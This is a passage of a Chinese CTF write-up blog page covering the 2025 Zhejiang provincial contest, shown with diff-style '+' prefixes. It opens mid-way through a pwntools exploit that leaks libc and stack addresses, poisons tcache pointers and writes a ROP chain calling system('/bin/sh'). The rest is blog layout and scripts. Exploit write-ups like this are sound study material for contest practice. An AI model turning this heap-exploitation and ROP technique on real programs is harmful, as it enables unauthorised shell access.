class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x21ace0</span></span><br><span class="line">info(<span class="string">&quot;libc_base: &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">stdout=libc_base+libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">info(<span class="string">&quot;stdout: &quot;</span>+<span class="built_in">hex</span>(stdout))</span><br><span class="line">environ=libc_base+libc.sym[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line"></span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x200</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x200</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x220</span>,<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x200</span>)+p64(<span class="number">0x210</span>)*<span class="number">2</span>+p64((environ-<span class="number">0x10</span>)^(key+<span class="number">1</span>)))</span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x200</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x200</span>,<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>))</span><br><span class="line">show(<span class="number">10</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>))</span><br><span class="line">stack=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">info(<span class="string">&quot;stack: &quot;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x220</span>,<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x200</span>)+p64(<span class="number">0x210</span>)*<span class="number">2</span>+p64((stack-<span class="number">0x148</span>)^(key+<span class="number">1</span>)))</span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x200</span>)</span><br><span class="line">dbg()</span><br><span class="line">payload=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(libc_base+<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdi;ret&#x27;</span>),executable=<span class="literal">True</span>)))</span><br><span class="line">payload+=p64(libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)))</span><br><span class="line">payload+=p64(libc_base+<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;ret;&#x27;</span>),executable=<span class="literal">True</span>)))</span><br><span class="line">payload+=p64(libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x200</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>
+
+
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> 2025浙江省省赛-初赛-wp</li>
+        <li><strong>Author:</strong> yfor</li>
+        <li><strong>Created at
+                :</strong> 2025-11-10 00:06:35</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2025-11-10 00:06:20
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://yfor-yfor.github.io/2025/11/10/2025浙江省省赛-初赛-wp/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/wp/">#wp</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+
+
+		
+		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+			<div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.mjs';
+
+      function loadWaline() {
+        init({
+          el: '#waline',
+          serverURL: 'https://example.example.com',
+          dark: 'body[class~="dark-mode"]',
+          reaction: false,
+          requiredMeta: ['nick', 'mail'],
+          emoji: [],
+                    lang: 'zh-CN',
+        });
+      }
+
+      if (typeof swup !== 'undefined') {
+        loadWaline();
+      } else {
+        window.addEventListener('DOMContentLoaded', loadWaline);
+      }
+    </script>
+
+
+
+        
+    
+</div>
+
+		</div>
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title">2025浙江省省赛-初赛-wp</div>
+		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E9%93%BE%E6%8E%A5"><span class="nav-text">题目链接</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#rop"><span class="nav-text">rop</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="nav-text">题目分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF"><span class="nav-text">攻击思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp"><span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#one"><span class="nav-text">one</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90-1"><span class="nav-text">题目分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp-1"><span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#bad-heap"><span class="nav-text">bad_heap</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90-2"><span class="nav-text">题目分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="nav-text">攻击流程</span></a></li></ol></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">yfor</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        1 posts in total
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.5</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+		<li class="go-comment">
+			<i class="fa-regular fa-comments"></i>
+		</li>
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container">
+	<img src="">
+</div>
+
+	
+	<div class="search-pop-overlay">
+	<div class="popup search-popup">
+		<div class="search-header">
+			<span class="search-input-field-pre">
+				<i class="fa-solid fa-keyboard"></i>
+			</span>
+			<div class="search-input-container">
+				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input">
+			</div>
+			<span class="popup-btn-close">
+				<i class="fa-solid fa-times"></i>
+			</span>
+		</div>
+		<div id="search-result">
+			<div id="no-result">
+				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+			</div>
+		</div>
+	</div>
+</div>
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+	
+<script src="/js/build/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/build/utils.js" type="module"></script>
+
+<script src="/js/build/main.js" type="module"></script>
+
+<script src="/js/build/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/build/layouts/categoryList.js" type="module"></script>
+
+
+
+    
+<script src="/js/build/tools/localSearch.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/runtime.js"></script>
+
+    
+<script src="/js/build/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/build/libs/Typed.min.js"></script>
+
+  
+<script src="/js/build/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+
+
+
+    
+<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+
+	
+</body>
+
+</html>
